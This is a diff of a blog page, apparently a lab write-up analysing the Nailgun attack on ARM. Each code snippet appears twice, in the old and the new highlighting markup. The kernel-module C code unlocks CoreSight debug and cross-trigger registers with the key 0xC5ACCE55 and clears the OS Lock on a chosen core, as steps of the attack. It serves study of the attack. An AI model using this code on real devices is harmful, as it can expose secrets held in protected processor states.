-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">read_scr1</span><span class="params">(<span class="type">void</span> *addr)</span>&#123;</span><br><span class="line">    <span class="comment">// Step 1: Unlock debug and cross trigger reigsters</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nailgun_param</span> *<span class="title">param</span> =</span> (<span class="keyword">struct</span> nailgun_param*)addr;</span><br><span class="line">    printk(KERN_INFO<span class="string">&quot;Step 1: Unlock debug and cross trigger registers\n&quot;</span>);</span><br><span class="line">    iowrite32(<span class="number">0xC5ACCE55</span>, param-&gt;debug_register + EDLAR_OFFSET);</span><br><span class="line">    iowrite32(<span class="number">0xC5ACCE55</span>, param-&gt;cti_register + EDLAR_OFFSET);</span><br><span class="line">    printk(KERN_INFO<span class="string">&quot;Step 1(Add): Lock OS registers\n&quot;</span>);</span><br><span class="line">    iowrite32(<span class="number">0xC5ACCE55</span>, param-&gt;debug_register + OSLAR_OFFSET);</span><br><span class="line">    iowrite32(<span class="number">0xC5ACCE55</span>, param-&gt;cti_register + OSLAR_OFFSET);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">read_scr1</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token comment">// Step 1: Unlock debug and cross trigger reigsters</span>
+    <span class="token keyword">struct</span> <span class="token class-name">nailgun_param</span> <span class="token operator">*</span>param <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">nailgun_param</span><span class="token operator">*</span><span class="token punctuation">)</span>addr<span class="token punctuation">;</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO<span class="token string">"Step 1: Unlock debug and cross trigger registers\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">iowrite32</span><span class="token punctuation">(</span><span class="token number">0xC5ACCE55</span><span class="token punctuation">,</span> param<span class="token operator">-></span>debug_register <span class="token operator">+</span> EDLAR_OFFSET<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">iowrite32</span><span class="token punctuation">(</span><span class="token number">0xC5ACCE55</span><span class="token punctuation">,</span> param<span class="token operator">-></span>cti_register <span class="token operator">+</span> EDLAR_OFFSET<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO<span class="token string">"Step 1(Add): Lock OS registers\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">iowrite32</span><span class="token punctuation">(</span><span class="token number">0xC5ACCE55</span><span class="token punctuation">,</span> param<span class="token operator">-></span>debug_register <span class="token operator">+</span> OSLAR_OFFSET<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">iowrite32</span><span class="token punctuation">(</span><span class="token number">0xC5ACCE55</span><span class="token punctuation">,</span> param<span class="token operator">-></span>cti_register <span class="token operator">+</span> OSLAR_OFFSET<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>unlock the OS Lock <strong>by executing the code directly on core
 0.</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unlock_debug</span><span class="params">(<span class="type">void</span>* _)</span> &#123;</span><br><span class="line">	<span class="comment">// Unlock self debug registers</span></span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Step 1(Add): unlock the OS Lock not using MAP\n&quot;</span>);</span><br><span class="line">	<span class="type">uint32_t</span> reg = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mcr p14, 0, %0, c1, c0, 4&quot;</span>:<span class="string">&quot;=r&quot;</span>(reg))</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">unlock_debug</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span> _<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	<span class="token comment">// Unlock self debug registers</span>
+	<span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"Step 1(Add): unlock the OS Lock not using MAP\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token class-name">uint32_t</span> reg <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	<span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mcr p14, 0, %0, c1, c0, 4"</span><span class="token operator">:</span><span class="token string">"=r"</span><span class="token punctuation">(</span>reg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Change <code>nailgun_init</code> <strong>as follows:</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smp_call_function_single(<span class="number">1</span>,read_scr1,param,<span class="number">1</span>);</span><br><span class="line">smp_call_function_single(<span class="number">0</span>, unlock_debug, param, <span class="number">1</span>);</span><br><span class="line">smp_call_function_single(<span class="number">1</span>,read_scr,param,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">smp_call_function_single</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>read_scr1<span class="token punctuation">,</span>param<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">smp_call_function_single</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> unlock_debug<span class="token punctuation">,</span> param<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">smp_call_function_single</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>read_scr<span class="token punctuation">,</span>param<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>Therefore, we can unlock the OS Lock in this lab except memory
 mapping</p>
 <p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/q2_2.png" /></p>
@@ -557,9 +637,9 @@ mapping</p>
 
           <div class="post-tags">
               <a href="/tags/Security/" rel="tag"># Security</a>
-              <a href="/tags/Linux/" rel="tag"># Linux</a>
-              <a href="/tags/Attack/" rel="tag"># Attack</a>
               <a href="/tags/ARM/" rel="tag"># ARM</a>
+              <a href="/tags/Attack/" rel="tag"># Attack</a>
+              <a href="/tags/Linux/" rel="tag"># Linux</a>
           </div>
 
         
@@ -611,7 +691,7 @@ mapping</p>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19 分钟</span>
+    <span title="站点阅读时长">18 分钟</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
